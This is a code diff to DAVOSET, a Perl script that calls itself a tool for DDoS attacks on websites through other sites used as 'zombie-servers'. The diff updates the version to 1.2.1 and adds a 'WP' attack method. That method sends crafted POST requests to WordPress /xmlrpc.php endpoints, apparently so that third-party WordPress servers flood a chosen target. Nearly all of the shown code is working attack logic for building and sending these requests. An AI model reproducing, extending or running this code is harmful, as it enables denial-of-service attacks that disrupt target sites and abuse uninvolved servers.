@@ -1,13 +1,13 @@
 #!/usr/bin/perl
 # DDoS attacks via other sites execution tool
-# DAVOSET v.1.2
+# DAVOSET 1.2.1
 # Tool for conducting of DDoS attacks on the sites via other sites
 # Copyright (C) MustLive 2010-2014
-# Last update: 26.04.2014
+# Last update: 23.10.2014
 # http://websecurity.com.ua
 #############################################
 # Settings
-my $version = "1.2"; # program version
+my $version = "1.2.1"; # program version
 my $agent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"; # user agent
 my $default_port = "80"; # default port of the host
 my $show_stat = 1; # show statistic of work
@@ -100,7 +100,7 @@ for ($cycle=0;$cycle<$cycles;$cycle++) {
 		if ($item) {
 			print ++$i."\n";
 			my ($url,$method,$file) = split /;/,$item;
-			if ($method eq "POST" or $method eq "XML") {
+			if ($method eq "POST" or $method eq "XML" or $method eq "WP") {
 				if (open(FILE,"<$file")) {
 					my $params = <FILE>;
 					chomp($params);
@@ -201,8 +201,12 @@ sub Attack { # send request to zombie-server
 		print $sock "Connection: close\n\n";
 		print $sock "$params\r\n\r\n";
 	}
-	elsif ($method eq "XML") {
+	elsif ($method eq "XML" or $method eq "WP") {
 		$params =~ s|http://site|$site|;
+		if ($method eq "WP") {
+			$params =~ s|http://source|$host|;
+			$page = "/xmlrpc.php";
+		}
 		print $sock "POST $page HTTP/1.1\n";
 		print $sock "Host: $host\n";
 		print $sock "User-Agent: $agent\n";
@@ -231,7 +235,7 @@ sub Attack { # send request to zombie-server
 			$traffic .= "Cookie: $cookie\n" if $cookie;
 			$traffic .= "Connection: close\n\n$params\r\n\r\n";
 		}
-		elsif ($method eq "XML") {
+		elsif ($method eq "XML" or $method eq "WP") {
 			$traffic .= "POST $page HTTP/1.1\nHost: $host\nUser-Agent: $agent\nAccept: */*\nContent-Length: ". length($params) ."\nContent-Type: application/x-www-form-urlencoded\nConnection: close\n\n$params\r\n\r\n";
 		}
 		else {
@@ -250,7 +254,7 @@ sub Test { # test list of zombie-servers
 		if ($item) {
 			print ++$i." - ";
 			my ($url,$method,$file) = split /;/,$item;
-			if ($method eq "POST" or $method eq "XML") {
+			if ($method eq "POST" or $method eq "XML" or $method eq "WP") {
 				if (open(FILE,"<$file")) {
 					my $params = <FILE>;
 					chomp($params);
